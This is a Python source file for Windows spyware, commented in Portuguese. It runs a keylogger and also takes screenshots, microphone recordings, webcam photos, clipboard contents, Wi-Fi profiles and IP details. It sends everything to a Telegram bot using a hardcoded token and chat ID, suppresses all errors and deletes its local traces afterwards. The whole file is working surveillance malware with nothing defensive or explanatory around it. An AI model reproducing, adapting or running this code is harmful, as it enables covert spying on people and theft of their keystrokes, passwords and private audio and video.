import subprocess
import socket
import os
import re
import json
import time
import shutil
import requests
import logging
from multiprocessing import Process

import win32clipboard
import cv2
import sounddevice
from scipy.io.wavfile import write as write_rec
from pynput.keyboard import Key, Listener
from PIL import ImageGrab

# Configurações do Telegram
TELEGRAM_BOT_TOKEN = "8251493660:AAGhmmMQJt8qlq8sSMRY1aUNOCl0gA27_HY"
TELEGRAM_CHAT_ID = "-5094323716"

################ Funções para Telegram ################

def send_to_telegram(message):
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    payload = {'chat_id': TELEGRAM_CHAT_ID, 'text': message, 'parse_mode': 'HTML'}
    try:
        requests.post(url, data=payload, timeout=10)
    except: pass

def send_file_to_telegram(file_path, caption=""):
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendDocument"
    try:
        with open(file_path, 'rb') as file:
            files = {'document': file}
            data = {'chat_id': TELEGRAM_CHAT_ID, 'caption': caption}
            requests.post(url, files=files, data=data, timeout=30)
    except: pass

def send_photo_to_telegram(photo_path, caption=""):
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendPhoto"
    try:
        with open(photo_path, 'rb') as photo:
            files = {'photo': photo}
            data = {'chat_id': TELEGRAM_CHAT_ID, 'caption': caption}
            requests.post(url, files=files, data=data, timeout=30)
    except: pass

################ Funções Principais ################

def logg_keys(file_path):
    logging.basicConfig(filename=(file_path + 'key_logs.txt'), level=logging.DEBUG, format='%(asctime)s: %(message)s')
    def on_press(key):
        try: logging.info(str(key.char))
        except AttributeError:
            if key == Key.space: logging.info(" ")
            elif key == Key.enter: logging.info("\n")
            else: logging.info(f"[{{key}}]")
    with Listener(on_press=on_press) as listener:
        listener.join()

def screenshot(file_path):
    screenshots_dir = os.path.join(file_path, 'Screenshots')
    os.makedirs(screenshots_dir, exist_ok=True)
    for x in range(0, 5):
        try:
            pic = ImageGrab.grab()
            screenshot_path = os.path.join(screenshots_dir, f'screenshot{x}.png')
            pic.save(screenshot_path)
            send_photo_to_telegram(screenshot_path, f"Screenshot {x+1}")
            time.sleep(10)
        except: pass

def microphone(file_path):
    for x in range(0, 3):
        try:
            fs = 44100
            seconds = 5
            myrecording = sounddevice.rec(int(seconds * fs), samplerate=fs, channels=2)
            sounddevice.wait()
            recording_path = file_path + f'mic_recording{x}.wav'
            write_rec(recording_path, fs, myrecording)
            send_file_to_telegram(recording_path, f"Gravação de Áudio {x+1}")
            os.remove(recording_path)
            time.sleep(5)
        except: pass

def webcam(file_path):
    webcam_dir = os.path.join(file_path, 'WebcamPics')
    os.makedirs(webcam_dir, exist_ok=True)
    try:
        cam = cv2.VideoCapture(0)
        for x in range(0, 5):
            ret, img = cam.read()
            if ret:
                photo_path = os.path.join(webcam_dir, f'webcam{x}.jpg')
                cv2.imwrite(photo_path, img)
                send_photo_to_telegram(photo_path, f"Webcam {x+1}")
                os.remove(photo_path)
                time.sleep(8)
    except: pass
    finally:
        if 'cam' in locals(): cam.release()

def main():
    base_dir = 'C:\\Users\\Public\\Logs'
    os.makedirs(base_dir, exist_ok=True)
    file_path = base_dir + '\\'
    send_to_telegram("📱 <b>Iniciando coleta de informações...</b>")

    # Informações de Rede
    try:
        network_info = []
        ip_result = subprocess.run(['ipconfig', '/all'], capture_output=True, text=True, shell=True)
        network_info.append("=== IP CONFIG ===\n" + ip_result.stdout)
        wifi_result = subprocess.run(['netsh', 'wlan', 'show', 'profiles'], capture_output=True, text=True, shell=True)
        network_info.append("\n=== WIFI PROFILES ===\n" + wifi_result.stdout)
        network_text = "\n".join(network_info)
        with open(file_path + 'network_info.txt', 'w', encoding='utf-8') as f: f.write(network_text)
        chunks = [network_text[i:i+4000] for i in range(0, len(network_text), 4000)]
        for i, chunk in enumerate(chunks):
            send_to_telegram(f"🌐 <b>Informações de Rede (Parte {i+1}):</b>\n<code>{chunk}</code>")
    except: pass

    # Informações do Sistema
    try:
        hostname = socket.gethostname()
        private_ip = socket.gethostbyname(hostname)
        try: public_ip = requests.get('https://api.ipify.org', timeout=5).text
        except: public_ip = "Não disponível"
        sys_info = f"Hostname: {hostname}\nIP Privado: {private_ip}\nIP Público: {public_ip}"
        send_to_telegram(f"💻 <b>Informações do Sistema:</b>\n<code>{sys_info}</code>")
    except: pass

    # Clipboard
    try:
        win32clipboard.OpenClipboard()
        data = win32clipboard.GetClipboardData()
        win32clipboard.CloseClipboard()
        if data.strip():
            send_to_telegram(f"📋 <b>Clipboard:</b>\n<code>{data[:1000]}</code>")
    except: pass

    # Processos Paralelos
    processes = []
    p1 = Process(target=logg_keys, args=(file_path,)); processes.append(p1); p1.start()
    p2 = Process(target=screenshot, args=(file_path,)); processes.append(p2); p2.start()
    p3 = Process(target=microphone, args=(file_path,)); processes.append(p3); p3.start()
    p4 = Process(target=webcam, args=(file_path,)); processes.append(p4); p4.start()

    for p in processes: p.join(timeout=35)
    for p in processes:
        if p.is_alive(): p.terminate()

    try:
        shutil.rmtree(base_dir, ignore_errors=True)
        send_to_telegram("✅ <b>Coleta concluída!</b>")
    except: pass

if __name__ == '__main__':
    try: main()
    except: pass
